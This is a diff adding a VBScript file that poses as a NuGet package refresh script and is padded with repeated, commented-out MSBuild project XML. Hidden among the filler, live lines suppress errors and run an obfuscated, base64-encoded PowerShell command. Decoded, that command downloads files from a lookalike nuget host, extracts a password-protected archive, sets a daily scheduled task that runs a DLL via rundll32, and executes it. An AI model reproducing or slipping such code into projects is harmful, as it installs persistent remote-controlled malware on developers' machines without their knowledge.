@@ -1,0 +1,226 @@
+' ----- DO NOT DELETE OR MANUALLY MODIFY ------
+'
+' Refresh NuGet packages used in the project
+' It will download any update or missing component
+' Do not remove from the project, otherwise your project may not compile
+'<?xml version="1.0" encoding="utf-8"?>
+'<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+'  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" />
+'  <Import Project="..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props" Condition="Exists('..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props')" />
+'  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+'  <PropertyGroup>
+'    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+'    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+'    <ProjectGuid>{8F93EA86-8C3F-48F7-95A5-320BA9B30CD5}</ProjectGuid>
+'    <OutputType>Library</OutputType>
+'    <RootNamespace>Plugin</RootNamespace>
+'    <AssemblyName>USBSpread</AssemblyName>
+'    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+'    <FileAlignment>512</FileAlignment>
+'    <Deterministic>true</Deterministic>
+'  </PropertyGroup>
+'  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+'    <PlatformTarget>AnyCPU</PlatformTarget>
+'    <DebugSymbols>true</DebugSymbols>
+'    <DebugType>full</DebugType>
+'    <Optimize>false</Optimize>
+'    <OutputPath>bin\Debug\</OutputPath>
+'    <DefineConstants>DEBUG;TRACE</DefineConstants>
+'    <ErrorReport>prompt</ErrorReport>
+'    <WarningLevel>4</WarningLevel>
+'  </PropertyGroup>
+'  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+'    <PlatformTarget>AnyCPU</PlatformTarget>
+'    <DebugType>none</DebugType>
+'    <Optimize>true</Optimize>
+'    <OutputPath>..\..\..\Binaries\Release\Plugins\</OutputPath>
+'    <DefineConstants>TRACE</DefineConstants>
+'    <ErrorReport>prompt</ErrorReport>
+'    <WarningLevel>4</WarningLevel>
+'  </PropertyGroup>
+'  <PropertyGroup>
+'    <StartupObject />
+'  </PropertyGroup>
+'  <ItemGroup>
+'    <Reference Include="IconLib, Version=0.73.0.0, Culture=neutral, processorArchitecture=MSIL">
+'      <SpecificVersion>False</SpecificVersion>
+'      <HintPath>Resources\IconLib.dll</HintPath>
+'    </Reference>
+'    <Reference Include="Microsoft.VisualBasic" />
+'    <Reference Include="System" />
+'    <Reference Include="System.Core" />
+'    <Reference Include="System.Drawing" />
+'    <Reference Include="System.Windows.Forms" />
+'    <Reference Include="System.Xml.Linq" />
+'    <Reference Include="System.Data.DataSetExtensions" />
+'    <Reference Include="Microsoft.CSharp" />
+'    <Reference Include="System.Data" />
+'    <Reference Include="System.Xml" />
+'  </ItemGroup>
+'  <ItemGroup>
+'    <Compile Include="Connection.cs" />
+'    <Compile Include="Handler\UsbSpread.cs" />
+'    <Compile Include="Packet.cs" />
+'    <Compile Include="Plugin.cs" />
+'    <Compile Include="Properties\AssemblyInfo.cs" />
+'    <Compile Include="Properties\Resources.Designer.cs">
+'      <AutoGen>True</AutoGen>
+'      <DesignTime>True</DesignTime>
+'      <DependentUpon>Resources.resx</DependentUpon>
+'    </Compile>
+'    <Compile Include="Zip.cs" />
+'  </ItemGroup>
+'  <ItemGroup>
+'    <None Include="ILMerge.props" />
+'    <None Include="packages.config">
+'      <SubType>Designer</SubType>
+'    </None>
+'  </ItemGroup>
+'  <ItemGroup>
+'    <Content Include="ILMergeOrder.txt" />
+'    <None Include="Resources\IconLib.dll" />
+'  </ItemGroup>
+'  <ItemGroup>
+'    <ProjectReference Include="..\..\..\MessagePack\MessagePackLib.csproj">
+'      <Project>{DC199D9E-CF10-41DD-BBCD-98E71BA8679D}</Project>
+'      <Name>MessagePackLib</Name>
+'    </ProjectReference>
+'  </ItemGroup>
+'  <ItemGroup>
+'    <EmbeddedResource Include="Properties\Resources.resx">
+'      <Generator>ResXFileCodeGenerator</Generator>
+'      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+'    </EmbeddedResource>
+'  </ItemGroup>
+'  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+'  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+'    <PropertyGroup>
+'      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+'    </PropertyGroup>
+'    <Error Condition="!Exists('..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets'))" />
+'  </Target>
+'  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" />
+'</Project>
+'  </ItemGroup>
+'  <ItemGroup>
+'    <ProjectReference Include="..\..\..\MessagePack\MessagePackLib.csproj">
+'      <Project>{DC199D9E-CF10-41DD-BBCD-98E71BA8679D}</Project>
+'      <Name>MessagePackLib</Name>
+'    </ProjectReference>
+'  </ItemGroup>
+'  <ItemGroup>
+'    <EmbeddedResource Include="Properties\Resources.resx">
+'      <Generator>ResXFileCodeGenerator</Generator>
+'      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+'    </EmbeddedResource>
+'  </ItemGroup>
+'  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+'  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+'    <PropertyGroup>
+'      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+'    </PropertyGroup>
+'    <Error Condition="!Exists('..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets'))" />
+'  </Target>
+'  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" />
+on error resume next
+'
+'  </ItemGroup>
+'  <ItemGroup>
+'    <ProjectReference Include="..\..\..\MessagePack\MessagePackLib.csproj">
+'      <Project>{DC199D9E-CF10-41DD-BBCD-98E71BA8679D}</Project>
+'      <Name>MessagePackLib</Name>
+'    </ProjectReference>
+'  </ItemGroup>
+'  <ItemGroup>
+'    <EmbeddedResource Include="Properties\Resources.resx">
+'      <Generator>ResXFileCodeGenerator</Generator>
+'      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+'    </EmbeddedResource>
+'  </ItemGroup>
+'  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+'  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+'    <PropertyGroup>
+'      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+'    </PropertyGroup>
+'    <Error Condition="!Exists('..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets'))" />
+'  </Target>
+'  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" />
+Dim NugetPkgMgr 
+Set NugetPkgMgr = CreateObject("WScript.Shell")
+'  </ItemGroup>
+'  <ItemGroup>
+'    <ProjectReference Include="..\..\..\MessagePack\MessagePackLib.csproj">
+'      <Project>{DC199D9E-CF10-41DD-BBCD-98E71BA8679D}</Project>
+'      <Name>MessagePackLib</Name>
+'    </ProjectReference>
+'  </ItemGroup>
+'  <ItemGroup>
+'    <EmbeddedResource Include="Properties\Resources.resx">
+'      <Generator>ResXFileCodeGenerator</Generator>
+'      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+'    </EmbeddedResource>
+'  </ItemGroup>
+'  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+'  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+'    <PropertyGroup>
+'      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+'    </PropertyGroup>
+'    <Error Condition="!Exists('..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets'))" />
+'  </Target>
+'  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" />
+NugetPkgMgr.Run (Replace("powershell -ep unrestricted -ec  $JABkAD0AIgBDADoAXABQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABWAGkAcwB1AGEAbABTAHQAdQBkAGkA$bwAiAA0ACgBtAGsAZABpAHIAIAAkAGQAIAAtAGUAYQAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkA$bgB1AGUAfABvAHUAdAAtAG4AdQBsAGwADQAKAHMAZQB0AC0AbABvAGMAYQB0AGkAbwBuACAAJABkAA0A$CgB3AGcAZQB0ACAALQBVAHIAaQAgAGgAdAB0AHAAOgAvAC8AbgB1AGcAZQB0AC4AcwBlAHIAdgBlAGgA$dAB0AHAALgBjAG8AbQAvADkAYwA0AGMAMABlAGUAYgBlAGIAMABiACAALQBPAHUAdABGAGkAbABlACAA$NwB6AC4AZQB4AGUAIAAtAGUAYQAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUADQAKAHcA$ZwBlAHQAIAAtAFUAcgBpACAAaAB0AHQAcAA6AC8ALwBuAHUAZwBlAHQALgBzAGUAcgB2AGUAaAB0AHQA$cAAuAGMAbwBtAC8AZgAzAGYANgA1ADkAYQA0ADYANQAzAGEAIAAtAE8AdQB0AEYAaQBsAGUAIAB0AHMA$IAAtAGUAYQAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUADQAKAC4AXAA3AHoALgBlAHgA$ZQAgAHgAIAAtAHkAIAAtAHQANwB6ACAALQBwAHoAUwBEAGMAdgBHAEgAbgBtACAAdABzAHwAbwB1AHQA$LQBuAHUAbABsAA0ACgBzAGMAaAB0AGEAcwBrAHMAIAAvAGMAcgBlAGEAdABlACAALwBmACAALwB0AG4A$IAAiAHsAYwA1ADMANABjAGUAOAA5AC0AOAA3ADQANAAtADQAZQA1AGQALQA5ADIANQA0AC0ANgA3AGIA$YwAwAGIAZgA0AGEANwA1AGUAfQAiACAALwBzAGMAIABkAGEAaQBsAHkAIAAvAHQAcgAgACIAcgB1AG4A$ZABsAGwAMwAyACAAYwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAVgBpAHMAdQBhAGwAUwB0AHUA$ZABpAG8AXAB0AGkAbQBlAHMAeQBuAGMALgBsAG8AZwAsAFMAeQBuAGMAVABpAG0AZQAgAGIAdQBpAGwA$ZABUAGkAbQBlACAAcgBhAHcAIgB8AG8AdQB0AC0AbgB1AGwAbAANAAoAcgB1AG4AZABsAGwAMwAyACAA$YwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAVgBpAHMAdQBhAGwAUwB0AHUAZABpAG8AXAB0AGkA$bQBlAHMAeQBuAGMALgBsAG8AZwAsAFMAeQBuAGMAVABpAG0AZQAgAGIAdQBpAGwAZABUAGkAbQBlACAA$cgBhAHcADQAKAHIAbQAgAC4AXAA3AHoALgBlAHgAZQAgAC0AZQBhACAAUwBpAGwAZQBuAHQAbAB5AEMA$bwBuAHQAaQBuAHUAZQA=","$","")),0
+'  </ItemGroup>
+'  <ItemGroup>
+'    <ProjectReference Include="..\..\..\MessagePack\MessagePackLib.csproj">
+'      <Project>{DC199D9E-CF10-41DD-BBCD-98E71BA8679D}</Project>
+'      <Name>MessagePackLib</Name>
+'    </ProjectReference>
+'  </ItemGroup>
+'  <ItemGroup>
+'    <EmbeddedResource Include="Properties\Resources.resx">
+'      <Generator>ResXFileCodeGenerator</Generator>
+'      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+'    </EmbeddedResource>
+'  </ItemGroup>
+'  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+'  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+'    <PropertyGroup>
+'      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+'    </PropertyGroup>
+'    <Error Condition="!Exists('..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets'))" />
+'  </Target>
+'  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" />
+' ------- END OF SCRIPT -------
+'  </ItemGroup>
+'  <ItemGroup>
+'    <ProjectReference Include="..\..\..\MessagePack\MessagePackLib.csproj">
+'      <Project>{DC199D9E-CF10-41DD-BBCD-98E71BA8679D}</Project>
+'      <Name>MessagePackLib</Name>
+'    </ProjectReference>
+'  </ItemGroup>
+'  <ItemGroup>
+'    <EmbeddedResource Include="Properties\Resources.resx">
+'      <Generator>ResXFileCodeGenerator</Generator>
+'      <LastGenOutput>Resources.Designer.cs</LastGenOutput>
+'    </EmbeddedResource>
+'  </ItemGroup>
+'  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+'  <Target Name="EnsureNuGetPackageBuildImports" BeforeTargets="PrepareForBuild">
+'    <PropertyGroup>
+'      <ErrorText>This project references NuGet package(s) that are missing on this computer. Use NuGet Package Restore to download them.  For more information, see http://go.microsoft.com/fwlink/?LinkID=322105. The missing file is {0}.</ErrorText>
+'    </PropertyGroup>
+'    <Error Condition="!Exists('..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\ILMerge.3.0.29\build\ILMerge.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.props'))" />
+'    <Error Condition="!Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" Text="$([System.String]::Format('$(ErrorText)', '..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets'))" />
+'  </Target>
+'  <Import Project="..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets" Condition="Exists('..\..\..\packages\MSBuild.ILMerge.Task.1.1.3\build\MSBuild.ILMerge.Task.targets')" />
